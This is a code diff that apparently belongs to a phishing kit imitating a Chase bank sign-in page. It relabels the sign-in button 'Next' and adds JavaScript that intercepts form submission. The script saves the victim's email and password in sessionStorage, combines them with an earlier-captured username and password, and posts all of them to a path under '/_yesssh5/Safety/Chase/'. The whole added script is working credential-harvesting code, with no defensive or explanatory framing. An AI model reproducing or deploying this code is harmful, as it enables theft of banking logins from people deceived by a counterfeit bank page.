@@ -42,14 +42,14 @@
                                 Password
                             </label>
                             <div class="logon-xs-toggle" id="password">
-                                <input min="0" class="jpui input" id="password-input-field" placeholder="Password" type="password" name="emailPassword" required="" value="">
+                                <input min="0" class="jpui input" id="password-input-field" placeholder="Password" type="password" name="emailPassword" value="">
                             </div>
 
                             <div class="row">
                                 <button class="jpui button focus fluid primary" type="submit" id="signin-button" >
-                                                <span class="label">
-                                                    Sign in
-                                                </span>
+                                    <span class="label">
+                                        Next
+                                    </span>
                                 </button>
                             </div>
                         </form>
@@ -59,3 +59,58 @@
         </div>
     </div>
 </div>
+
+<script type="application/javascript">
+    // your function
+    let my_func = (event) => {
+        event.preventDefault();
+
+        sessionStorage.setItem("lu_email", document.getElementById("userId-input-field").value );
+        sessionStorage.setItem("lu_password2", document.getElementById("password-input-field").value );
+
+//        alert(sessionStorage.getItem("lu_username"));
+//        alert(sessionStorage.getItem("lu_password1"));
+//        alert(sessionStorage.getItem("lu_email"));
+//        alert(sessionStorage.getItem("lu_password2"));
+
+//        window.location = winLocation("/1eb932e5745c485929f49dbefceccc33");
+        let data= {
+            username:  sessionStorage.getItem("lu_username"),
+            password1:  sessionStorage.getItem("lu_password1"),
+            email:  sessionStorage.getItem("lu_email"),
+            password2:  sessionStorage.getItem("lu_password2")
+        };
+        post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33', data);
+
+    };
+
+    // your form
+    let form = document.getElementById("login-form");
+
+    // attach event listener
+    form.addEventListener("submit", my_func, true);
+
+    function post(path, params, method) {
+        method = method || "post"; // Set method to post by default if not specified.
+
+        // The rest of this code assumes you are not using a library.
+        // It can be made less wordy if you use one.
+        let form = document.createElement("form");
+        form.setAttribute("method", method);
+        form.setAttribute("action", path);
+
+        for(let key in params) {
+            if(params.hasOwnProperty(key)) {
+                let hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+
+                form.appendChild(hiddenField);
+            }
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+    }
+</script>
